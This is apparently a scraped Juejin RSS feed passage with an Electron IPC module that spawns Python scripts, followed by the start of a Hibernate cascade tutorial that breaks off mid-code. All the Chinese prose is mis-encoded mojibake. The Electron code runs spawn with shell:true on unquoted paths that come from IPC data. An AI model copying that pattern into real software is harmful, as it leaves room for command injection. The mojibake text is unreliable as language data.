<p>çŸ¥é“äº†é—®é¢˜ï¼Œç›´æ¥å°±æ˜¯è®©GPTå¸®æˆ‘ä»¬ç›´æ¥ç”¨äºŒçš„æ–¹å¼è§£å†³ï¼Œå¹¶æä¾›å¯ç”¨ä»£ç ï¼Œè¿™é‡Œä¹Ÿæ˜¯è¦å’ŒAIäº¤äº’å¾ˆä¹…ï¼ˆå°±ä¸ä¸€ ä¸€åˆ—ä¸¾äº†ï¼‰ï¼Œæœ€ç»ˆä»£ç ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">buildPythonEnv</span>(<span class="hljs-params">pythonPath, environmentVar</span>) {
  <span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">"path"</span>);

  <span class="hljs-keyword">const</span> condaRoot = path.<span class="hljs-title function_">dirname</span>(path.<span class="hljs-title function_">dirname</span>(pythonPath));

  <span class="hljs-keyword">return</span> {
    ...process.<span class="hljs-property">env</span>,

    <span class="hljs-attr">PATH</span>: <span class="hljs-string">`<span class="hljs-subst">${environmentVar}</span><span class="hljs-subst">${condaRoot}</span>/bin:/usr/bin:/bin`</span>,
    <span class="hljs-attr">CONDA_PREFIX</span>: condaRoot,
    <span class="hljs-attr">LD_LIBRARY_PATH</span>: <span class="hljs-string">`<span class="hljs-subst">${condaRoot}</span>/lib`</span>,
    <span class="hljs-attr">PYTHONHOME</span>: condaRoot,

    <span class="hljs-attr">HOME</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">HOME</span>,
    <span class="hljs-attr">USER</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">USER</span>
  };
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">runScript</span>(<span class="hljs-params">ipcMain, app, path, fs, spawn</span>) {
  <span class="hljs-comment">// è¿è¡Œè„šæœ¬ -- ç­‰å¾…ç»“æœ</span>
  ipcMain.<span class="hljs-title function_">handle</span>(<span class="hljs-string">"runScript"</span>, <span class="hljs-keyword">async</span> (event, data) =&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> userDataPath = app.<span class="hljs-title function_">getPath</span>(<span class="hljs-string">"userData"</span>);
        <span class="hljs-keyword">const</span> configPath = path.<span class="hljs-title function_">join</span>(userDataPath, <span class="hljs-string">"scripts"</span>, <span class="hljs-string">"config.json"</span>);
        <span class="hljs-comment">// è¯»å– config.json</span>
        <span class="hljs-keyword">if</span> (!fs.<span class="hljs-title function_">existsSync</span>(configPath)) {
          <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(
            <span class="hljs-string">"The config.json file does not exist. Please initialize the scripts folder first"</span>
          );
        }

        <span class="hljs-keyword">const</span> config = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(fs.<span class="hljs-title function_">readFileSync</span>(configPath, <span class="hljs-string">"utf-8"</span>));
        <span class="hljs-keyword">const</span> { pythonPath, scriptPath, environmentVar } = config;

        <span class="hljs-keyword">if</span> (!pythonPath || !scriptPath || !environmentVar) {
          <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"config.json ç¼ºå°‘ pythonPath æˆ– scriptPath æˆ– environmentVar"</span>);
        }

        <span class="hljs-keyword">const</span> env = <span class="hljs-title function_">buildPythonEnv</span>(pythonPath, environmentVar);

        <span class="hljs-keyword">const</span> logFile = path.<span class="hljs-title function_">join</span>(data.<span class="hljs-property">logPath</span>, <span class="hljs-string">`<span class="hljs-subst">${data.logName}</span>.log`</span>);
        <span class="hljs-keyword">const</span> outFd = fs.<span class="hljs-title function_">openSync</span>(logFile, <span class="hljs-string">"a"</span>);

        <span class="hljs-keyword">const</span> child = <span class="hljs-title function_">spawn</span>(pythonPath, [scriptPath, <span class="hljs-string">"-c"</span>, data.<span class="hljs-property">inputJsonPath</span>], {
          env,
          <span class="hljs-attr">shell</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">stdio</span>: [<span class="hljs-string">"ignore"</span>, outFd, outFd]
        });

        child.<span class="hljs-title function_">on</span>(<span class="hljs-string">"error"</span>, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
          <span class="hljs-title function_">reject</span>(<span class="hljs-string">`bash å¯åŠ¨å¤±è´¥: <span class="hljs-subst">${err.message}</span>`</span>);
        });

        child.<span class="hljs-title function_">on</span>(<span class="hljs-string">"close"</span>, <span class="hljs-function">(<span class="hljs-params">code</span>) =&gt;</span> {
          <span class="hljs-keyword">if</span> (code !== <span class="hljs-number">0</span>) {
            <span class="hljs-title function_">reject</span>(<span class="hljs-string">`è„šæœ¬æ‰§è¡Œå¤±è´¥ï¼Œé€€å‡ºç  <span class="hljs-subst">${code}</span>`</span>);
          } <span class="hljs-keyword">else</span> {
            <span class="hljs-title function_">resolve</span>(<span class="hljs-string">"è„šæœ¬æ‰§è¡Œå®Œæˆ"</span>);
          }
        });
      } <span class="hljs-keyword">catch</span> (err) {
        <span class="hljs-title function_">reject</span>(err.<span class="hljs-property">message</span>);
      }
    });
  });
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">runScriptNoWait</span>(<span class="hljs-params">ipcMain, app, path, fs, spawn</span>) {
  <span class="hljs-comment">// è¿è¡Œè„šæœ¬ -- ä¸ç­‰å¾…ç»“æœ</span>
  ipcMain.<span class="hljs-title function_">handle</span>(<span class="hljs-string">"runScriptNoWait"</span>, <span class="hljs-keyword">async</span> (event, data) =&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> userDataPath = app.<span class="hljs-title function_">getPath</span>(<span class="hljs-string">"userData"</span>);
        <span class="hljs-keyword">const</span> configPath = path.<span class="hljs-title function_">join</span>(userDataPath, <span class="hljs-string">"scripts"</span>, <span class="hljs-string">"config.json"</span>);
        <span class="hljs-comment">// è¯»å– config.json</span>
        <span class="hljs-keyword">if</span> (!fs.<span class="hljs-title function_">existsSync</span>(configPath)) {
          <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(
            <span class="hljs-string">"The config.json file does not exist. Please initialize the scripts folder first."</span>
          );
        }

        <span class="hljs-keyword">const</span> config = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(fs.<span class="hljs-title function_">readFileSync</span>(configPath, <span class="hljs-string">"utf-8"</span>));
        <span class="hljs-keyword">const</span> { pythonPath, scriptPath, environmentVar } = config;

        <span class="hljs-keyword">if</span> (!pythonPath || !scriptPath || !environmentVar) {
          <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"config.json ç¼ºå°‘ pythonPath æˆ– scriptPath æˆ– environmentVar"</span>);
        }

        <span class="hljs-keyword">const</span> env = <span class="hljs-title function_">buildPythonEnv</span>(pythonPath, environmentVar);

        <span class="hljs-keyword">const</span> logFile = path.<span class="hljs-title function_">join</span>(data.<span class="hljs-property">logPath</span>, <span class="hljs-string">`<span class="hljs-subst">${data.logName}</span>.log`</span>);
        <span class="hljs-keyword">const</span> outFd = fs.<span class="hljs-title function_">openSync</span>(logFile, <span class="hljs-string">"a"</span>);

        <span class="hljs-keyword">const</span> child = <span class="hljs-title function_">spawn</span>(pythonPath, [scriptPath, <span class="hljs-string">"-c"</span>, data.<span class="hljs-property">inputJsonPath</span>], {
          env,
          <span class="hljs-attr">shell</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">detached</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// è®©è„šæœ¬æˆä¸ºç‹¬ç«‹è¿›ç¨‹</span>
          <span class="hljs-attr">stdio</span>: [<span class="hljs-string">"ignore"</span>, outFd, outFd]
        });

        child.<span class="hljs-title function_">on</span>(<span class="hljs-string">"error"</span>, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
          <span class="hljs-title function_">reject</span>(<span class="hljs-string">`åå°è„šæœ¬å¯åŠ¨å¤±è´¥: <span class="hljs-subst">${err.message}</span>`</span>);
        });

        <span class="hljs-comment">// æ–­å¼€ Electron ä¸è„šæœ¬çš„å…³ç³»</span>
        child.<span class="hljs-title function_">unref</span>();

        <span class="hljs-comment">// å…³é”®ï¼šä¸ç­‰å¾…è„šæœ¬æ‰§è¡Œç»“æœ</span>
        <span class="hljs-title function_">resolve</span>(<span class="hljs-string">"è„šæœ¬å·²åœ¨åå°å¯åŠ¨"</span>);
      } <span class="hljs-keyword">catch</span> (err) {
        <span class="hljs-title function_">reject</span>(err.<span class="hljs-property">message</span>);
      }
    });
  });
}

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  runScript,
  runScriptNoWait
};
</code></pre>
<p>è¿™é‡Œå°±æ˜¯é…ç½®æ–‡ä»¶éœ€è¦ç¼–è¾‘çš„è¦å¤šä¸€äº›ï¼Œå¦‚å›¾</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6345be974f71450b8ef73b5c40bfe5f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUEJpdFc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460214&amp;x-signature=0qlgKtdb9nHoeJ5s7%2FkHch38%2FbI%3D" alt="image.png" loading="lazy"/></p>
<p>å¸Œæœ›è¿™äº›å‘å¯ä»¥å¸®åŠ©åˆ°å¤§å®¶ï¼Œè™½ç„¶æ˜¯AIè¾…åŠ©æå®šçš„ï¼Œä½†æ˜¯ä¹ŸèŠ±äº†ä¸å°‘æ—¶é—´ï¼Œå¦‚æœèƒ½åˆ·åˆ°èœé¸Ÿçš„æ–‡ç« ï¼Œå°±å¯ä»¥çœä¸‹ä¸å°‘æ—¶é—´ o(<em>ï¿£â–½ï¿£</em>)ãƒ–</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ28ï¼‰Hibernateçš„çº§è”æ“ä½œæ˜¯ä»€ä¹ˆï¼Ÿ]]></title>    <link>https://juejin.cn/post/7592148975849013291</link>    <guid>https://juejin.cn/post/7592148975849013291</guid>    <pubDate>2026-01-07T11:53:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592148975849013291" data-draft-id="7592159803411005476" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ28ï¼‰Hibernateçš„çº§è”æ“ä½œæ˜¯ä»€ä¹ˆï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-07T11:53:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ28ï¼‰Hibernateçš„çº§è”æ“ä½œæ˜¯ä»€ä¹ˆï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T11:53:40.000Z" title="Wed Jan 07 2026 11:53:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">Hibernateçš„çº§è”æ“ä½œ</h3>
<p>çº§è”æ“ä½œï¼ˆCascade Operationsï¼‰æ˜¯Hibernateæä¾›çš„ä¸€ç§æœºåˆ¶ï¼Œé€šè¿‡å®ƒå¯ä»¥åœ¨çˆ¶å®ä½“ä¸Šæ‰§è¡Œæ“ä½œæ—¶ï¼Œè‡ªåŠ¨å¯¹å…¶å…³è”çš„å­å®ä½“æ‰§è¡Œç›¸åº”çš„æ“ä½œã€‚è¿™æ ·å¯ä»¥ç®€åŒ–ä»£ç ï¼Œé¿å…æ‰‹åŠ¨ç®¡ç†å…³è”å®ä½“çš„çŠ¶æ€ã€‚</p>
<p>çº§è”æ“ä½œçš„ä¸»è¦ç±»å‹åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>CascadeType.PERSIST</strong>ï¼šåœ¨ä¿å­˜ï¼ˆpersistï¼‰çˆ¶å®ä½“æ—¶ï¼Œè‡ªåŠ¨ä¿å­˜å…³è”çš„å­å®ä½“ã€‚</li>
<li><strong>CascadeType.MERGE</strong>ï¼šåœ¨åˆå¹¶ï¼ˆmergeï¼‰çˆ¶å®ä½“æ—¶ï¼Œè‡ªåŠ¨åˆå¹¶å…³è”çš„å­å®ä½“ã€‚</li>
<li><strong>CascadeType.REMOVE</strong>ï¼šåœ¨åˆ é™¤ï¼ˆremoveï¼‰çˆ¶å®ä½“æ—¶ï¼Œè‡ªåŠ¨åˆ é™¤å…³è”çš„å­å®ä½“ã€‚</li>
<li><strong>CascadeType.DETACH</strong>ï¼šåœ¨åˆ†ç¦»ï¼ˆdetachï¼‰çˆ¶å®ä½“æ—¶ï¼Œè‡ªåŠ¨åˆ†ç¦»å…³è”çš„å­å®ä½“ã€‚</li>
<li><strong>CascadeType.REFRESH</strong>ï¼šåœ¨åˆ·æ–°ï¼ˆrefreshï¼‰çˆ¶å®ä½“æ—¶ï¼Œè‡ªåŠ¨åˆ·æ–°å…³è”çš„å­å®ä½“ã€‚</li>
<li><strong>CascadeType.ALL</strong>ï¼šåŒ…æ‹¬ä»¥ä¸Šæ‰€æœ‰çº§è”æ“ä½œã€‚</li>
</ul>
<h3 data-id="heading-1">ç¤ºä¾‹ä»£ç </h3>
<h4 data-id="heading-2">é…ç½®æ–‡ä»¶ <code>hibernate.cfg.xml</code></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- æ•°æ®åº“è¿æ¥é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate å±æ€§é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- æ˜ å°„ç±» --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Person"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Address"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-3">å®ä½“ç±» <code>Person</code> å’Œ <code>Address</code></h4>
<h5 data-id="heading-4">Personç±»</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;
<span class="hljs-keyword">import</span> java.util.HashSet;
<span class="hljs-keyword">import</span> java.util.Set;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "person")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "age")</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;

    <span class="hljs-meta">@OneToMany(mappedBy = "person", cascade = CascadeType.ALL, orphanRemoval = true)</span>
    <span class="hljs-keyword">private</span> Set&lt;Address&gt; addresses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-comment">// Getters å’Œ Setters</span>
    
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> age;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-keyword">public</span> Set&lt;Address&gt; <span class="hljs-title function_">getAddresses</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> addresses;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAddresses</span><span class="hljs-params">(Set&lt;Address&gt; addresses)</span> {
        <span class="hljs-built_in">this</span>.addresses = addresses;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addAddress</span><span class="hljs-params">(Address address)</span> {
        addresses.add(address);
        address.setPerson(<span class="hljs-built_in">this</span>);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeAddress</span><span class="hljs-params">(Address address)</span> {
        addresses.remove(address);
        address.setPerson(<span class="hljs-literal">null</span>);
    }
}
</code></pre>
<h5 data-id="heading-5">Addressç±»</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "address")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Address</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "street")</span>
    <span class="hljs-keyword">private</span> String street;

    <span class="hljs-meta">@ManyToOne</span>
    <span class="hljs-meta">@JoinColumn(name = "person_id", nullable = false)</span>
    <span class="hljs-keyword">private</span> Person person;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Address</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Address</span><span class="hljs-params">(String street, Person person)</span> {
        <span class="hljs-built_in">this</span>.street = street;
        <span class="hljs-built_in">this</span>.person = person;
    }

    <span class="hljs-comment">// Getters å’Œ Setters</span>
    
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getStreet</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> street;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setStreet</span><span class="hljs-params">(String street)</span> {
        <span class="hljs-built_in">this</span>.street = street;
    }

    <span class="hljs-keyword">public</span> Person <span class="hljs-title function_">getPerson</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> person;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPerson</span><span class="hljs-params">(Person person)</span> {
        <span class="hljs-built_in">this</span>.person = person;
    }
}
</code></pre>
<h3 data-id="heading-6">çº§è”æ“ä½œç¤ºä¾‹</h3>
<h5 data-id="heading-7">HibernateUtilç±»</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
